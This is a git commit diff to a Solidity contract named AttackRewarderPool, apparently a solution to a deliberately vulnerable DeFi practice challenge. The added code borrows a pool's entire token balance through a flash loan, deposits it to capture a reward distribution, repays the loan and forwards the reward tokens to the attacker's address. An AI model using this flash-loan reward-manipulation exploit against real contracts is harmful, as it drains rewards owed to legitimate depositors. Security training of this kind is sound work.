8ae1176d1749de8364aed691878243fe424eaf20
kkeaveney <kevinkeaveney@gmail.com>
2023-03-13 16:45:44 +0000

    repay flashLoan

--- contracts/Vulnerable/V2/Rewarder/AttackRewarderPool.sol
+++ contracts/Vulnerable/V2/Rewarder/AttackRewarderPool.sol
@@ -2,26 +2,53 @@
 
 pragma solidity ^0.8.0;
 import "./FlashLoanerPool.sol";
+import "./TheRewarderPool.sol";
 import "../DamnValuableToken.sol";
+import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 
 contract AttackRewarderPool {
-    FlashLoanerPool public pool;
+    FlashLoanerPool public flashLoanPool;
     DamnValuableToken public liquidityToken;
+    TheRewarderPool public rewardPool;
 
-    constructor(address _pool, address _liquidityToken) {
-        pool = FlashLoanerPool(_pool);
+    address private rewardToken;
+    address private owner;
+
+    constructor(
+        address _pool,
+        address _liquidityToken,
+        address _rewardPool,
+        address _rewardTokenAddress
+    ) {
+        flashLoanPool = FlashLoanerPool(_pool);
         liquidityToken = DamnValuableToken(_liquidityToken);
+        rewardPool = TheRewarderPool(_rewardPool);
+        rewardToken = _rewardTokenAddress;
+        owner = msg.sender;
     }
 
     function receiveFlashLoan(uint256 amount) external {
-        // Return tokens from Flash loan
+        // set reward pool allowance
+        liquidityToken.approve(address(rewardPool), amount);
+        // deposit, and distributeRewards
+        rewardPool.deposit(amount);
+        rewardPool.distributeRewards();
+
+        // withdraw liquidity tokens to pay back Flashloan
+        rewardPool.withdraw(amount);
+
+        // Return tokens from Flashloan
         liquidityToken.transfer(msg.sender, amount);
+
+        // send rewardToken balance to EOA
+        uint256 rewardsBalance = IERC20(rewardToken).balanceOf(address(this));
+        IERC20(rewardToken).transfer(owner, rewardsBalance);
     }
 
     function execute() external {
         // get liquidity token balance of pool
-        uint256 amount = liquidityToken.balanceOf(address(pool));
+        uint256 amount = liquidityToken.balanceOf(address(flashLoanPool));
         // flash loan with entore pool
-        pool.flashLoan(amount);
+        flashLoanPool.flashLoan(amount);
     }
 }
